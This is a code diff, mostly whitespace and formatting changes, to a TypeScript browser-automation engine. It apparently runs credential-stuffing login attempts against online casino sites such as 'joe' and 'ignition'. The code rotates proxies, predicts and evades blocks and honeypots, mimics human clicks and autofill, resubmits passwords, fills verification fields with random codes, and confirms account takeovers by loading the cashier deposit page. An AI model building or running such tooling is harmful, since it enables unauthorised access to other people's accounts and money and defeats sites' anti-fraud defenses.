@@ -4018,7 +4018,7 @@ export class AutomationEngine extends EventEmitter {
           if (response === "other") {
             this.log("INFO", `  ${siteLabel || ""}: Still no response. Redirecting to cashier to confirm login...`);
             const cashierUrl = new URL(loginUrl).origin + "/account/cashier/deposit/cc";
-            await page.goto(cashierUrl, { waitUntil: "domcontentloaded", timeout: 15000 }).catch(() => {});
+            await page.goto(cashierUrl, { waitUntil: "domcontentloaded", timeout: 15000 }).catch(() => { });
             await this.sleep(3000); // Wait for potential bounce redirect back to login
 
             if (!page.isClosed()) {
@@ -4146,14 +4146,14 @@ export class AutomationEngine extends EventEmitter {
           } catch (e: unknown) {
             const msg = ((e instanceof Error ? e.message : String(e)) || String(e)).toLowerCase();
             if (msg.includes("err_invalid_auth_credentials") || msg.includes("err_proxy_auth") ||
-                msg.includes("err_proxy_connection_failed") || msg.includes("err_connection_refused") ||
-                msg.includes("err_empty_response") || msg.includes("err_connection_closed") ||
-                msg.includes("err_name_not_resolved")) {
+              msg.includes("err_proxy_connection_failed") || msg.includes("err_connection_refused") ||
+              msg.includes("err_empty_response") || msg.includes("err_connection_closed") ||
+              msg.includes("err_name_not_resolved")) {
               throw new PreemptiveBlockError((e instanceof Error ? e.message : String(e)));
             }
             if (msg.includes("timeout")) {
-               this.log("WARN", `  Phase 1 Watchdog (7s) triggered, executing Phase 2 reload...`);
-               return await page.reload({ waitUntil: "networkidle", timeout: 60000 });
+              this.log("WARN", `  Phase 1 Watchdog (7s) triggered, executing Phase 2 reload...`);
+              return await page.reload({ waitUntil: "networkidle", timeout: 60000 });
             }
             throw e;
           }
@@ -4163,9 +4163,9 @@ export class AutomationEngine extends EventEmitter {
         lastErr = e;
         const msg = ((e instanceof Error ? e.message : String(e)) || String(e)).toLowerCase();
         if (msg.includes("err_invalid_auth_credentials") || msg.includes("err_proxy_auth") ||
-            msg.includes("err_proxy_connection_failed") || msg.includes("err_connection_refused") ||
-            msg.includes("err_empty_response") || msg.includes("err_connection_closed") ||
-            msg.includes("err_connection_timed_out") || msg.includes("timeout") || msg.includes("err_name_not_resolved")) {
+          msg.includes("err_proxy_connection_failed") || msg.includes("err_connection_refused") ||
+          msg.includes("err_empty_response") || msg.includes("err_connection_closed") ||
+          msg.includes("err_connection_timed_out") || msg.includes("timeout") || msg.includes("err_name_not_resolved")) {
           throw new PreemptiveBlockError((e instanceof Error ? e.message : String(e)));
         }
         if (i === attempts) break;
@@ -4180,7 +4180,7 @@ export class AutomationEngine extends EventEmitter {
   /** Navigate to `url` with fallback support. If the primary URL fails,
    *  it iterates through `fallbackUrls`. Returns the successful origin and response so
    *  subsequent flows (like verifyUrl) can stay on the same domain. */
-  private async gotoWithFallback(page: Page, site: SiteConfig, attempts: number = DynamicTimings.GOTO_RETRY_ATTEMPTS): Promise<{origin: string, response: import("playwright-core").Response | null}> {
+  private async gotoWithFallback(page: Page, site: SiteConfig, attempts: number = DynamicTimings.GOTO_RETRY_ATTEMPTS): Promise<{ origin: string, response: import("playwright-core").Response | null }> {
     const urls = [site.url, ...(site.fallbackUrls || [])];
     let lastErr: any = null;
     for (const url of urls) {
@@ -4195,9 +4195,9 @@ export class AutomationEngine extends EventEmitter {
         // If it's a proxy/connection error, don't waste time trying fallback URLs
         // because the proxy itself is dead, not the target domain.
         if (msg.includes("err_invalid_auth_credentials") || msg.includes("err_proxy_auth") ||
-            msg.includes("err_proxy_connection_failed") || msg.includes("err_connection_refused") ||
-            msg.includes("err_empty_response") || msg.includes("err_connection_closed") ||
-            msg.includes("err_connection_timed_out") || msg.includes("timeout") || msg.includes("err_name_not_resolved")) {
+          msg.includes("err_proxy_connection_failed") || msg.includes("err_connection_refused") ||
+          msg.includes("err_empty_response") || msg.includes("err_connection_closed") ||
+          msg.includes("err_connection_timed_out") || msg.includes("timeout") || msg.includes("err_name_not_resolved")) {
           throw new PreemptiveBlockError((e instanceof Error ? e.message : String(e)));
         }
         this.log("WARN", `  Failed to load ${url}, falling back...`);
@@ -4875,7 +4875,7 @@ export class AutomationEngine extends EventEmitter {
 
         // 5. temporarily / locked / blocked / too many → temporarily_disabled
         if (lower.includes("temporarily") || lower.includes("locked") ||
-            lower.includes("blocked") || lower.includes("too many")) { recordNetwork("tempdisabled"); return; }
+          lower.includes("blocked") || lower.includes("too many")) { recordNetwork("tempdisabled"); return; }
 
         // 6. permanently / been disabled → permanently_disabled
         if (lower.includes("permanently") || lower.includes("been disabled")) { recordNetwork("disabled"); return; }
@@ -4922,10 +4922,10 @@ export class AutomationEngine extends EventEmitter {
       loginPath: loginPathname,
       siteName: site.name,
     });
-    
+
     // Apex Enhancement #5: Inject Zero-Sleep DOM Classifier for dual-system
     await injectDualClassifier(page, site.name);
-    
+
     if (!(page as any).__casinoObserverInstalled) {
       (page as any).__casinoObserverInstalled = true;
     }
@@ -5142,11 +5142,11 @@ export class AutomationEngine extends EventEmitter {
       if (this._flowScreenshotter.isActive) {
         // Capture one final screenshot of the terminal state
         if (!page.isClosed()) {
-          await this._flowScreenshotter.capture(page, `outcome-${result.outcome}`).catch(() => {});
+          await this._flowScreenshotter.capture(page, `outcome-${result.outcome}`).catch(() => { });
         }
         this._flowScreenshotter.finalize(result.outcome);
       }
-      
+
       // Apex Enhancement #10: Record session telemetry
       try {
         const matrix = await page.evaluate(() => (window as any).__automatiTimelineMatrix || {}).catch(() => ({}));
@@ -5339,12 +5339,12 @@ export class AutomationEngine extends EventEmitter {
       codegenExporter.startSession((page as any).__sessionId, site.name);
     }
 
-    const flowStep = <T>(name: string, loc: string, action: () => Promise<T>) => 
+    const flowStep = <T>(name: string, loc: string, action: () => Promise<T>) =>
       this.executeFlowStep(name, loc, action, { email: cred.email, site: site.name, sessionId: (page as any).__sessionId ?? "unknown" })
         .then(async (result) => {
           // Flow-step screenshot capture (non-blocking)
           if (this._flowScreenshotter.isActive && !page.isClosed()) {
-            await this._flowScreenshotter.capture(page, name).catch(() => {});
+            await this._flowScreenshotter.capture(page, name).catch(() => { });
           }
           return result;
         });
@@ -5368,7 +5368,7 @@ export class AutomationEngine extends EventEmitter {
         "engine.ts:4869",
         async () => {
           const res = await this.gotoWithFallback(page, site);
-          
+
           // Apex Enhancement #9: Pre-emptive Block Detection
           if (res && res.response) {
             const blockPrediction = await analyzeInitialResponse(res.response, site.name);
@@ -5377,18 +5377,18 @@ export class AutomationEngine extends EventEmitter {
               throw new PreemptiveBlockError(`Nav block: ${blockPrediction.reason}`);
             }
           }
-          
+
           return res.origin;
         }
       );
-      
+
       // Secondary check post-load
       const resourcePrediction = await analyzePageResources(page, site.name);
       if (resourcePrediction.isLikelyBlocked) {
         this.log("WARN", `🚨 Pre-emptive block detected post-load: ${resourcePrediction.reason}`);
         throw new PreemptiveBlockError(`Resource block: ${resourcePrediction.reason}`);
       }
-      
+
       this.log("DEBUG", `[FLOW DEBUG] ✅ executeFlowStep Navigation completed`);
       if (site.verifyUrl && site.verifyUrl.startsWith("/")) {
         site.verifyUrl = origin + site.verifyUrl;
@@ -5453,7 +5453,7 @@ export class AutomationEngine extends EventEmitter {
         const loginPath = new URL(site.url).pathname.toLowerCase();
         if (currentPath !== loginPath) {
           this.log("DEBUG", `  Re-navigating to login page for retry: ${site.url}`);
-          await this.gotoWithFallback(page, site, 1).catch(() => {});
+          await this.gotoWithFallback(page, site, 1).catch(() => { });
         }
       }
 
@@ -5547,9 +5547,9 @@ export class AutomationEngine extends EventEmitter {
           // ── 12% chance: simulate Chrome autofill (saved credentials) ──
           let chosenSubmitMethod = "click";
           let success = false;
-          
+
           await flowStep("Setup Submit Mutation Observer", "engine.ts:setupSubmitObserver", async () => setupSubmitMutationObserver(page, selectors.submit, selectors.username));
-          
+
           if (site.name === "joe" || site.name === "ignition") {
             this.log("DEBUG", `[FLOW DEBUG] ⏳ Starting universalLoginFlow`);
             const result = await Promise.race([
@@ -5617,7 +5617,7 @@ export class AutomationEngine extends EventEmitter {
                 const STATUS_SYM = Symbol.for("cloak_status");
                 (window as any)[STATUS_SYM] = null;
               }).catch(() => { });
-              
+
               const submitBox = await page.locator(selectors.submit).boundingBox().catch(() => null);
               if (submitBox) {
                 const offsetX = gaussianClamped(0, 1.5, -4, 4);
@@ -5741,37 +5741,37 @@ export class AutomationEngine extends EventEmitter {
         if (!fastStatus) fastStatus = (await uiRace) || getNetworkDetection();
 
         const urlMovedAfterSubmit = this.isUrlChangedAwayFromLogin(site.url, page.url());
-        
+
         // --- NEW MUTATION OBSERVER LOGIC ---
         // If we haven't already detected a fast success/status, and the URL hasn't moved,
         // we check the submit mutation result to see if an error message actually appeared.
         let skippedByMutation = false;
         if (!fastStatus && !urlMovedAfterSubmit) {
-            const mutationResult = await flowStep("Wait For Submit Mutation", "engine.ts:waitForMutation", async () => waitForSubmitMutationResult(page, 2000));
-            
-            // If the error text didn't change (swallowed), or if it DID change but it's the very first attempt (likely cookie notice intercepting click)
-            const isFirstAttemptCookieIntercept = mutationResult && mutationResult.errorVaried && attemptIdx === 0;
-            const isSubmitSwallowed = mutationResult && !mutationResult.errorVaried;
+          const mutationResult = await flowStep("Wait For Submit Mutation", "engine.ts:waitForMutation", async () => waitForSubmitMutationResult(page, 2000));
 
-            if (isSubmitSwallowed || isFirstAttemptCookieIntercept) {
-                const retryCount = mutationRetryCounts.get(attemptIdx) || 0;
-                if (retryCount >= 2) {
-                    this.log("WARN", `  ${site.name}: ⚠ Max mutation retries (2) reached — classifying as incorrect`);
-                    response = "incorrect";
-                } else {
-                    mutationRetryCounts.set(attemptIdx, retryCount + 1);
-                    const reason = isFirstAttemptCookieIntercept ? "Error banner on first attempt (likely cookie intercept)" : "Submit swallowed";
-                    this.log("WARN", `  ${site.name}: ⚠ ${reason} (retry ${retryCount + 1}/2) — resubmitting same password`);
-                    lastResponse = null;
-                    resetNetworkDetection();
-                    attemptIdx--; // Resubmit SAME password
-                    skippedByMutation = true;
-                }
+          // If the error text didn't change (swallowed), or if it DID change but it's the very first attempt (likely cookie notice intercepting click)
+          const isFirstAttemptCookieIntercept = mutationResult && mutationResult.errorVaried && attemptIdx === 0;
+          const isSubmitSwallowed = mutationResult && !mutationResult.errorVaried;
+
+          if (isSubmitSwallowed || isFirstAttemptCookieIntercept) {
+            const retryCount = mutationRetryCounts.get(attemptIdx) || 0;
+            if (retryCount >= 2) {
+              this.log("WARN", `  ${site.name}: ⚠ Max mutation retries (2) reached — classifying as incorrect`);
+              response = "incorrect";
+            } else {
+              mutationRetryCounts.set(attemptIdx, retryCount + 1);
+              const reason = isFirstAttemptCookieIntercept ? "Error banner on first attempt (likely cookie intercept)" : "Submit swallowed";
+              this.log("WARN", `  ${site.name}: ⚠ ${reason} (retry ${retryCount + 1}/2) — resubmitting same password`);
+              lastResponse = null;
+              resetNetworkDetection();
+              attemptIdx--; // Resubmit SAME password
+              skippedByMutation = true;
             }
+          }
         }
 
         if (skippedByMutation) {
-            continue;
+          continue;
         }
 
         const timeout = attemptIdx === 2 ? DynamicTimings.RESPONSE_TIMEOUT_LAST_ATTEMPT : DynamicTimings.RESPONSE_TIMEOUT_DEFAULT;
@@ -5911,7 +5911,7 @@ export class AutomationEngine extends EventEmitter {
                 (el as HTMLInputElement).value = code;
                 el.dispatchEvent(new Event('input', { bubbles: true }));
                 el.dispatchEvent(new Event('change', { bubbles: true }));
-              }, { sel: verifInputSel, code: randCode }).catch(() => {});
+              }, { sel: verifInputSel, code: randCode }).catch(() => { });
               this.log("DEBUG", `  ${site.name}: Filled verification input (${verifInputSel}) with ${randCode}`);
             } else {
               this.log("WARN", `  ${site.name}: No verification input found — proceeding with triple-click only`);
@@ -5962,7 +5962,7 @@ export class AutomationEngine extends EventEmitter {
 
             if (verifSubmitSel) {
               // Triple-click: three rapid clicks with tiny gap between each
-              await humanClickSelector(page, verifSubmitSel, { clickCount: 3, force: true }).catch(() => {});
+              await humanClickSelector(page, verifSubmitSel, { clickCount: 3, force: true }).catch(() => { });
               this.log("DEBUG", `  ${site.name}: Triple-clicked verification submit (${verifSubmitSel})`);
             } else {
               this.log("WARN", `  ${site.name}: No verification submit button found`);
@@ -5975,7 +5975,7 @@ export class AutomationEngine extends EventEmitter {
             await page.evaluate(() => {
               const STATUS_SYM = Symbol.for("cloak_status");
               (window as any)[STATUS_SYM] = null;
-            }).catch(() => {});
+            }).catch(() => { });
             resetNetworkDetection();
 
             // Re-navigate to login and restart this same attempt index
@@ -6041,7 +6041,7 @@ export class AutomationEngine extends EventEmitter {
         this.log("INFO", `  ${site.name}: Potential outcome ("${response}") detected! Validating via mandatory cashier check to ensure no hidden successes...`);
         // We wait a brief moment for the application to settle, but no extended banner waiting.
         await this.sleep(1000);
-        
+
         const rootRedirectVerification = await this.confirmRootRedirectViaCashier(page, site, `attempt ${attemptNum}`);
         if (rootRedirectVerification === "success") {
           const isVisuallyConfirmed = await verifyLoginSuccessVisually(page);
@@ -6054,7 +6054,7 @@ export class AutomationEngine extends EventEmitter {
             // Do not return here, let it fall through to the unconfirmed block below
           }
         }
-        
+
         // If the cashier check fails or bounces back to login, we override/preserve the outcome
         if (rootRedirectVerification === "unconfirmed") {
           if (response === "success") {
@@ -6078,7 +6078,7 @@ export class AutomationEngine extends EventEmitter {
           await this.smartAttemptPause(page);
           return { outcome: "noaccount", attempts: attemptNum };
         }
-        
+
         // Fallback if verification logic itself was skipped/disabled by config
         if (response === "incorrect") {
           this.log("INFO", `  ${site.name}: Cashier check bypassed, proceeding with "incorrect" outcome.`);
@@ -6118,14 +6118,14 @@ export class AutomationEngine extends EventEmitter {
       if (response === "disabled") {
         this.log("ERR", `  ${site.name}: account permanently disabled on attempt ${attemptNum}`);
         // Blueprint: Deadlock Flush — navigate to about:blank to purge DOM memory leaks
-        await page.goto('about:blank', { timeout: 5000 }).catch(() => {});
+        await page.goto('about:blank', { timeout: 5000 }).catch(() => { });
         throw new PermDisabledError();
       }
 
       if (response === "tempdisabled") {
         await page.waitForLoadState('networkidle', { timeout: 10000 }).catch(() => { });
         // Blueprint: Deadlock Flush — navigate to about:blank to purge DOM memory leaks
-        await page.goto('about:blank', { timeout: 5000 }).catch(() => {});
+        await page.goto('about:blank', { timeout: 5000 }).catch(() => { });
         throw new TempDisabledError();
       }
 
@@ -6240,7 +6240,7 @@ export class AutomationEngine extends EventEmitter {
             }, 500);
           });
           observer.observe(document.body, { childList: true, subtree: true, attributes: true, characterData: true });
-          
+
           fallbackTimeout = setTimeout(() => {
             observer.disconnect();
             if (timeout) clearTimeout(timeout);
@@ -6375,7 +6375,7 @@ export class AutomationEngine extends EventEmitter {
             break;
           }
         }
-        import('./metrics.js').then(m => m.engineRowsProcessed.inc({ outcome: aggregateOutcome, backend: row.backend || "unknown" })).catch(() => {});
+        import('./metrics.js').then(m => m.engineRowsProcessed.inc({ outcome: aggregateOutcome, backend: row.backend || "unknown" })).catch(() => { });
       }
       this.emit("row-update", structuredClone(row));
     }
@@ -6464,7 +6464,7 @@ export class AutomationEngine extends EventEmitter {
     // Write report to file
     try {
       const reportDir = path.join(process.cwd(), 'rotation-reports');
-      await fs.promises.mkdir(reportDir, { recursive: true }).catch(()=>{});
+      await fs.promises.mkdir(reportDir, { recursive: true }).catch(() => { });
       const reportPath = path.join(reportDir, `rotation-report-${Date.now()}.json`);
       await fs.promises.writeFile(reportPath, JSON.stringify(diagnostic, null, 2));
       this.log("INFO", `📋 Rotation diagnostic report saved to: ${reportPath}`);
@@ -6507,7 +6507,7 @@ export class AutomationEngine extends EventEmitter {
       }
       if (config.proxyRotateUrl) {
         try {
-          fetch(config.proxyRotateUrl).catch(() => {});
+          fetch(config.proxyRotateUrl).catch(() => { });
           fixes.push(`Proxy rotation triggered via URL: ${config.proxyRotateUrl}`);
           this.log("WARN", `${modeName} AUTO-FIX: Proxy rotation URL triggered`);
         } catch (e) {
@@ -6647,7 +6647,7 @@ export class AutomationEngine extends EventEmitter {
     const filename = `experimental_elimination_results_${ts}.csv`;
     const csvContent = [header, ...rows].join("\n") + "\n";
 
-    fs.promises.writeFile(filename, csvContent, "utf-8").catch(()=>{});
+    fs.promises.writeFile(filename, csvContent, "utf-8").catch(() => { });
     this.log("INFO", `🧪 Experimental results written to ${filename} (${enriched.length} configs, ${enriched.filter(c => c.eliminated).length} eliminated, ${enriched.filter(c => !c.eliminated && c.totalAttempts > 0).length} surviving)`);
   }
 
@@ -6736,7 +6736,7 @@ export class AutomationEngine extends EventEmitter {
       uVis = results[0];
       pVis = results[1];
       sVis = results[2];
-      
+
       if (uVis && pVis && sVis) {
         this.log("INFO", `  ${site.name}: configured selectors found`);
         return site.selectors;
@@ -6963,7 +6963,7 @@ export class AutomationEngine extends EventEmitter {
                   entry[`${site.name}Status`] = "❌";
                   entry.status = "Failed";
                   entry._failedSites++;
-                  
+
                   if (result.outcome === "honeypot") {
                     entry._honeypots++;
                   } else if (result.outcome === "blocked") {
@@ -7042,7 +7042,7 @@ export class AutomationEngine extends EventEmitter {
         winnerBackend = entry.backend;
       }
     }
-    
+
     if (winnerBackend) {
       const winEntry = leaderboard.find(e => e.backend === winnerBackend);
       if (winEntry) winEntry.winner = true;
